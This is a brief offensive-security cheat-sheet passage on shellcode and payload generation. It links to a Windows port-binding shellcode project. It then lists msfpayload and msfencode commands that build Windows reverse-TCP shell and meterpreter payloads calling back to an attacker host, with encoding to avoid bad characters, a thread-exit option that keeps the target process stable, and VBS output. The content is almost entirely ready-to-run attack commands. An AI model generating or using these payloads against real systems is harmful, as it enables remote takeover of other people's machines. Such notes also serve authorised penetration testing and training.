- A small, null-free port binding shellcode for 32-bit versions of Windows: https://code.google.com/archive/p/w32-bind-ngs-shellcode/

## MSF Payload Generation Example
```
msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 C

msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 R | msfencode -b '\x00\x0a\x0d'
```

Use exit fuction, "exit thread" when program is multi-threaded to avoid crashes after shell code execution is done:
```
msfpayload windows/shell_reverse_tcp EXITFUNC=thread LHOST ip LPORT 4443 R | msfencode -b '\x00\x0a\x0d'
```

## VBS

```
msfpayload windows/meterpreter/reverse_tcp LHOST=<ip> R | msfencode
-e generic/none -t vbs
```
